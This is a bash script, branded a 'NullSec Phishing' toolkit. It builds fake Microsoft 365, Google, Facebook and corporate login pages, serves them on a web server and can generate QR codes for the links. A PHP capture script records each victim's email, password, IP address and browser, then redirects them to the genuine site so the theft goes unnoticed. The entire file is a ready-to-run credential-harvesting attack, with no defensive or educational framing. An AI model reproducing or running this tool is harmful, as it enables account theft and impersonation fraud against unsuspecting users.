#!/bin/bash
#===============================================================================
#  NULLSEC PHISHING - Credential Harvesting & Social Engineering Toolkit
#===============================================================================

PHISH_DIR="/root/loot/nullsec-phishing"
WEB_ROOT="/tmp/nullsec-phish"
CREDS_FILE="$PHISH_DIR/captured_creds.txt"
LISTEN_PORT="${LISTEN_PORT:-80}"

mkdir -p "$PHISH_DIR" "$WEB_ROOT"

log() { echo -e "\033[0;32m[+]\033[0m $1"; }
warn() { echo -e "\033[1;33m[!]\033[0m $1"; }

# Generate Microsoft 365 login page
gen_microsoft() {
    local dir="$WEB_ROOT/microsoft"
    mkdir -p "$dir"
    
    cat > "$dir/index.html" << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
        .logo { width: 108px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 600; margin: 16px 0; }
        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #666; font-size: 15px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; margin-top: 16px; }
        button:hover { background: #005a9e; }
        .links { margin-top: 16px; font-size: 13px; }
        .links a { color: #0067b8; text-decoration: none; }
        .error { color: #c42b1c; font-size: 13px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiPjxwYXRoIGZpbGw9IiM3MzcxNzMiIGQ9Ik0wIDBoMTAuOHYxMC44SDB6Ii8+PHBhdGggZmlsbD0iI0Y0NTIyMSIgZD0iTTEyIDBoMTAuOHYxMC44SDEyek0wIDEyaDEwLjh2MTAuOEgwek0xMiAxMmgxMC44djEwLjhIMTJ6Ii8+PC9zdmc+" alt="Microsoft">
        <h1>Sign in</h1>
        <form method="POST" action="capture.php">
            <input type="email" name="email" placeholder="Email, phone, or Skype" required>
            <input type="password" name="password" placeholder="Password" required>
            <div class="error" id="error">Your account or password is incorrect.</div>
            <button type="submit">Sign in</button>
        </form>
        <div class="links">
            <a href="#">Can't access your account?</a><br>
            <a href="#">Sign in with a security key</a>
        </div>
    </div>
</body>
</html>
HTML
    log "Microsoft 365 page: $dir"
}

# Generate Google login page
gen_google() {
    local dir="$WEB_ROOT/google"
    mkdir -p "$dir"
    
    cat > "$dir/index.html" << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Google Sans', Roboto, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; padding-top: 100px; }
        .container { width: 450px; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { width: 75px; display: block; margin: 0 auto 16px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #202124; font-size: 16px; margin-bottom: 32px; }
        input { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; cursor: pointer; float: right; margin-top: 32px; }
        .btn:hover { background: #1557b0; }
        .links { margin-top: 24px; }
        .links a { color: #1a73e8; text-decoration: none; font-size: 14px; }
        .forgot { color: #1a73e8; text-decoration: none; font-size: 14px; display: block; margin-top: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NSIgaGVpZ2h0PSIyNCI+PHBhdGggZmlsbD0iIzQyODVGNCIgZD0iTTYuMiAxMi4yYzAtLjUgMC0xIC4xLTEuNUg0LjV2Mi45aDQuNGMtLjIgMS0uOCAxLjktMS42IDIuNHYyaDIuNmMxLjUtMS40IDIuNC0zLjQgMi40LTUuOHoiLz48cGF0aCBmaWxsPSIjMzRBODUzIiBkPSJNNC41IDE4YzIuMiAwIDQtLjcgNS40LTIuMWwtMi42LTJjLS43LjUtMS42LjgtMi43LjgtMi4xIDAtMy45LTEuNC00LjUtMy4zaC0yLjd2Mi4xQzEuOSAxNi40IDQuMSAxOCA2LjUgMTh6Ii8+PHBhdGggZmlsbD0iI0ZCQkMwNSIgZD0iTS44IDExLjRjLS4yLS41LS4zLTEtLjMtMS42cy4xLTEuMS4zLTEuNlY2LjFILTEuOUM0LjEgNCA0LjUgMi40IDQuNSAuOHMtLjEtMS42LS4zLTIuNEw0LjUgOS44Yy42LTEuOSAyLjQtMy4zIDQuNS0zLjMgMS4yIDAgMi4zLjQgMy4xIDEuMmwyLjMtMi4zQy0uNy0uNy0uNy0uNy0uNy0uN3oiLz48cGF0aCBmaWxsPSIjRUE0MzM1IiBkPSJNNC41IDMuNWMxLjIgMCAyLjMuNCAxLjEgMS4ybDIuMy0yLjNDNi43IDEuMiA1LjYuNSA0LjUuNSAxLjkuNS0uMiAyLjEtMS45IDQuMmwyLjcgMi4xYy42LTEuOSAyLjQtMy4zIDQuNS0zLjN6Ii8+PC9zdmc+" alt="Google">
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form method="POST" action="capture.php">
            <input type="email" name="email" placeholder="Email or phone" required>
            <a class="forgot" href="#">Forgot email?</a>
            <input type="password" name="password" placeholder="Enter your password" required>
            <a class="forgot" href="#">Forgot password?</a>
            <div style="overflow: hidden;">
                <button class="btn" type="submit">Next</button>
            </div>
        </form>
        <div class="links">
            <a href="#">Create account</a>
        </div>
    </div>
</body>
</html>
HTML
    log "Google page: $dir"
}

# Generate Facebook login page
gen_facebook() {
    local dir="$WEB_ROOT/facebook"
    mkdir -p "$dir"
    
    cat > "$dir/index.html" << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>Log in to Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding-top: 72px; }
        .main { display: flex; justify-content: center; align-items: center; max-width: 980px; margin: 0 auto; }
        .left { padding-right: 32px; }
        .logo { width: 301px; margin: -28px; }
        .tagline { font-size: 28px; line-height: 32px; width: 500px; }
        .right { }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 396px; }
        input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        .btn { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 6px; }
        .btn:hover { background: #166fe5; }
        .forgot { text-align: center; margin: 16px 0; }
        .forgot a { color: #1877f2; text-decoration: none; font-size: 14px; }
        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 16px; }
        .create { background: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; padding: 12px 16px; font-weight: bold; cursor: pointer; display: block; margin: 0 auto; }
    </style>
</head>
<body>
    <div class="main">
        <div class="left">
            <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDEiIGhlaWdodD0iNjAiPjxwYXRoIGZpbGw9IiMxODc3ZjIiIGQ9Ik0wIDBjMCAxMSAwIDIyIDAgMzNzMCAxMSAwIDIyIDExIDAgMjIgMHMxMSAwIDIyIDB2LTI3aDE4di0xOGgtMTh2LTljMC03IDEtMTAgOC0xMGgxMFYwaC0xNmMtMTYgMC0yNCA4LTI0IDIzdjEySDRWNTRoMThWNTRINjBWMEgweiIvPjwvc3ZnPg==" alt="Facebook">
            <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <div class="login-box">
                <form method="POST" action="capture.php">
                    <input type="text" name="email" placeholder="Email address or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button class="btn" type="submit">Log In</button>
                </form>
                <div class="forgot"><a href="#">Forgotten password?</a></div>
                <hr>
                <button class="create">Create New Account</button>
            </div>
        </div>
    </div>
</body>
</html>
HTML
    log "Facebook page: $dir"
}

# Generate generic corporate login
gen_corporate() {
    local company="${1:-ACME Corp}"
    local dir="$WEB_ROOT/corporate"
    mkdir -p "$dir"
    
    cat > "$dir/index.html" << HTML
<!DOCTYPE html>
<html>
<head>
    <title>$company - Employee Portal</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #1e3a5f 0%, #2c5282 100%); margin: 0; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); width: 400px; }
        .logo { font-size: 24px; font-weight: bold; color: #1e3a5f; text-align: center; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #666; margin-bottom: 32px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1e3a5f; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 16px; }
        button:hover { background: #2c5282; }
        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">$company</div>
        <p class="subtitle">Employee Portal Login</p>
        <form method="POST" action="capture.php">
            <input type="text" name="email" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">
            <a href="#">Forgot Password?</a> | <a href="#">IT Support</a>
        </div>
    </div>
</body>
</html>
HTML
    log "Corporate page: $dir"
}

# PHP credential capture script
gen_capture_php() {
    cat > "$WEB_ROOT/capture.php" << 'PHP'
<?php
$creds_file = '/root/loot/nullsec-phishing/captured_creds.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

$entry = "[$time] IP: $ip\nEmail: $email\nPassword: $password\nUser-Agent: $ua\nReferer: $referer\n" . str_repeat('-', 60) . "\n";

file_put_contents($creds_file, $entry, FILE_APPEND);

// Redirect to real site
$redirect = 'https://login.microsoftonline.com';
if (strpos($referer, 'google') !== false) $redirect = 'https://accounts.google.com';
if (strpos($referer, 'facebook') !== false) $redirect = 'https://www.facebook.com';

header("Location: $redirect");
exit;
?>
PHP
    
    # Copy to all subdirs
    for dir in "$WEB_ROOT"/*/; do
        cp "$WEB_ROOT/capture.php" "$dir/" 2>/dev/null
    done
    
    log "Capture script deployed"
}

# Start phishing server
start_server() {
    log "Starting phishing server on port $LISTEN_PORT..."
    
    cd "$WEB_ROOT"
    
    # Try PHP built-in server first
    if command -v php &>/dev/null; then
        php -S 0.0.0.0:$LISTEN_PORT &
    else
        # Fallback to Python
        python3 -m http.server $LISTEN_PORT &
    fi
    
    log "Server running at http://$(hostname -I | awk '{print $1}'):$LISTEN_PORT"
    log "Available pages:"
    ls -d "$WEB_ROOT"/*/ 2>/dev/null | while read d; do
        echo "  - http://$(hostname -I | awk '{print $1}'):$LISTEN_PORT/$(basename $d)/"
    done
}

# View captured credentials
view_creds() {
    if [[ -f "$CREDS_FILE" ]]; then
        cat "$CREDS_FILE"
    else
        warn "No credentials captured yet"
    fi
}

# Generate all pages
gen_all() {
    log "Generating all phishing pages..."
    gen_microsoft
    gen_google
    gen_facebook
    gen_corporate "ACME Corp"
    gen_capture_php
    log "All pages ready in $WEB_ROOT"
}

# QR code generator for phishing links
gen_qrcode() {
    local url="$1"
    if command -v qrencode &>/dev/null; then
        qrencode -t UTF8 "$url"
    else
        warn "qrencode not installed. Install with: apt install qrencode"
    fi
}

# Cleanup
cleanup() {
    log "Cleaning up phishing infrastructure..."
    pkill -f "php -S" 2>/dev/null
    pkill -f "http.server" 2>/dev/null
    rm -rf "$WEB_ROOT"
    log "Cleanup complete"
}

case "${1:-menu}" in
    microsoft) gen_microsoft ;;
    google) gen_google ;;
    facebook) gen_facebook ;;
    corporate) shift; gen_corporate "$@" ;;
    capture) gen_capture_php ;;
    all) gen_all ;;
    start) start_server ;;
    creds) view_creds ;;
    qr) shift; gen_qrcode "$@" ;;
    cleanup) cleanup ;;
    *)
        echo "NullSec Phishing Toolkit"
        echo "Usage: $0 <command>"
        echo ""
        echo "Page Generators:"
        echo "  microsoft       - Microsoft 365 login"
        echo "  google          - Google login"
        echo "  facebook        - Facebook login"
        echo "  corporate [name] - Generic corporate portal"
        echo "  all             - Generate all pages"
        echo ""
        echo "Server:"
        echo "  start           - Start phishing server"
        echo "  creds           - View captured credentials"
        echo "  qr <url>        - Generate QR code"
        echo "  cleanup         - Stop server and cleanup"
        echo ""
        echo "Environment: LISTEN_PORT=$LISTEN_PORT"
        ;;
esac
